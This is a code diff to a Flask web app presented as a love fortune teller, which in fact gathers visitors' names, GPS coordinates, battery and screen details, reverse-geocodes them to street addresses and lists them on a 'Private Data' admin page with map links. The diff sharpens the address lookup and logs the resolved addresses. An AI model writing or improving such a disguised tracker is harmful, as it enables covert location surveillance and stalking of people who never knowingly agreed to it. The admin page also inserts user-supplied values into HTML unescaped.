@@ -21,12 +21,33 @@ def init_excel():
         df.to_excel(EXCEL_FILE, index=False)
 
 def geocode_reverse(lat, lon):
+    """Convert lat/lon to a human-readable address using Nominatim."""
     try:
-        url = f"https://nominatim.openstreetmap.org/reverse?lat={lat}&lon={lon}&format=json"
-        resp = requests.get(url, headers={'User-Agent': 'LoveTeller/1.0'}, timeout=8)
-        return resp.json().get('display_name', 'Hidden')
-    except:
-        return 'Private'
+        url = "https://nominatim.openstreetmap.org/reverse"
+        params = {
+            'lat': lat,
+            'lon': lon,
+            'format': 'json',
+            'addressdetails': 1,
+            'zoom': 18
+        }
+        headers = {
+            'User-Agent': 'LoveFortuneTeller/1.0 (contact@example.com)'  # Important!
+        }
+        response = requests.get(url, params=params, headers=headers, timeout=10)
+        
+        if response.status_code == 200:
+            data = response.json()
+            if 'display_name' in data:
+                # Limit length to avoid huge strings
+                return data['display_name'][:200]
+            else:
+                return f"Approx: {lat:.4f}, {lon:.4f}"
+        else:
+            return f"Coordinates: {lat:.4f}, {lon:.4f}"
+    except Exception as e:
+        print(f"Geocoding error: {e}")
+        return f"Location: {lat:.4f}, {lon:.4f}"
 
 HTML = '''<!DOCTYPE html>
 <html>
@@ -219,17 +240,15 @@ window.retry=function(){document.getElementById('form').style.display='none';ask
 </body>
 </html>'''
 
-
 @app.route('/')
 def home():
     return HTML
-
 
 @app.route('/save', methods=['POST'])
 def save_data():
     init_excel()
     try:
-        data    = request.json
+        data = request.json
         address = geocode_reverse(data['latitude'], data['longitude'])
 
         new_row = pd.DataFrame([{
@@ -260,12 +279,11 @@ def save_data():
             f"💓 {data['name']}, a wonderful surprise is waiting for your heart!",
             f"💝 {data['name']}, someone is secretly falling for you right now!"
         ]
-        print(f"✅ Saved: {data['name']} | {data['latitude']:.4f},{data['longitude']:.4f}")
+        print(f"✅ Saved: {data['name']} | {data['latitude']:.4f},{data['longitude']:.4f} -> {address[:60]}")
         return jsonify({'saved': True, 'fortune': random.choice(fortunes)})
     except Exception as e:
         print("ERR:", e)
         return jsonify({'saved': False}), 500
-
 
 @app.route('/admin', methods=['GET','POST'])
 def admin():
@@ -305,11 +323,11 @@ button{width:100%;padding:13px;background:linear-gradient(135deg,#ff6b6b,#c06c84
         gps  = f"{row['latitude']:.4f}, {row['longitude']:.4f}"
         maps = f"https://maps.google.com/?q={row['latitude']},{row['longitude']}"
         rows += f'''<tr>
-          <td>{row['timestamp']}</td>
-          <td><b>{row['name']}</b></td>
-          <td><a href="{maps}" target="_blank">📍 {gps}</a></td>
+           <td>{row['timestamp']}</td>
+           <td><b>{row['name']}</b></td>
+           <td><a href="{maps}" target="_blank">📍 {gps}</a></td>
           <td style="max-width:220px;font-size:11px;">{row['address']}</td>
-          <td>{row['battery']}</td>
+           <td>{row['battery']}</td>
           <td style="font-size:11px;">{row['screen']}</td>
         </tr>'''
 
@@ -328,11 +346,10 @@ a{{color:#c06c84;text-decoration:none;}}
 <body>
 <h1>💋 Private Data — {len(df)} entries</h1>
 <table>
-  <tr><th>Time</th><th>Name</th><th>Location</th><th>Address</th><th>Battery</th><th>Screen</th></tr>
+   <tr><th>Time</th><th>Name</th><th>Location</th><th>Address</th><th>Battery</th><th>Screen</th></tr>
   {rows}
 </table>
 </body></html>'''
-
 
 if __name__ == '__main__':
     init_excel()
